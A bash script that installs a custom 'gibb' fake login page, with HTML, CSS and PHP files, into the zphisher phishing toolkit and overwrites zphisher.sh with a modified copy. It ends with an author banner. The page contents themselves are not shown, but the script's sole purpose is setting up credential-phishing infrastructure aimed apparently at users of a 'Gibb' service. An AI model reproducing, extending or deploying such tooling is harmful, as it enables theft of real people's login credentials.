#!/bin/bash
gibbFolder="/home/$USER/zphisher/.sites/gibb"
cssFolder="/home/$USER/zphisher/.sites/gibb/css"
cssFile="/home/$USER/zphisher/.sites/gibb/css/app.css"
loginHtml="/home/$USER/zphisher/.sites/gibb/login.html"
indexPhp="/home/$USER/zphisher/.sites/gibb/index.php"
loginPhp="/home/$USER/zphisher/.sites/gibb/login.php"
zphisherOrg="/home/$USER/zphisher/zphisher.sh"

CreateFolderAndFiles(){
mkdir $gibbFolder
mkdir $cssFolder
touch $cssFile
touch $loginHtml 
touch $indexPhp 
touch $loginPhp

}

if [[ -d $gibbFolder ]]; then

rm -rf $gibbFolder
echo "Gibb Folder already exist, deleted the folder, please re-run the script :) "
exit 1

else 

CreateFolderAndFiles

fi

# Insert HTML info

htmlTxt="/home/$USER/Gibbzphisher/html.txt"

cp $htmlTxt $loginHtml

# Insert css info
cssTxt="/home/$USER/Gibbzphisher/css.txt"

cp $cssTxt $cssFile

# Insert index.php info

indexTxt="/home/$USER/Gibbzphisher/index.txt"

cp $indexTxt $indexPhp

# Insert login.php info

loginTxt="/home/$USER/Gibbzphisher/login.txt"

cp $loginTxt $loginPhp


# Insert zphisher.sh info

bashFile="/home/$USER/Gibbzphisher/bash.txt"

cp $bashFile $zphisherOrg


if grep -q "Gibb" $zphisherOrg; then

echo "Thanks for using my script. Created by:"

echo "    ____                                ";
echo "   / __ \____ _______      ______ ______";
echo "  / /_/ / __ \`/ ___/ | /| / / __ \`/ ___/";
echo " / ____/ /_/ / /   | |/ |/ / /_/ / /    ";
echo "/_/    \__,_/_/    |__/|__/\__,_/_/     ";
echo "                                        ";

exit 0
else 
echo "something went wrong, make sure that you have cloned the zphisher repo while running this script."
exit 1 
fi

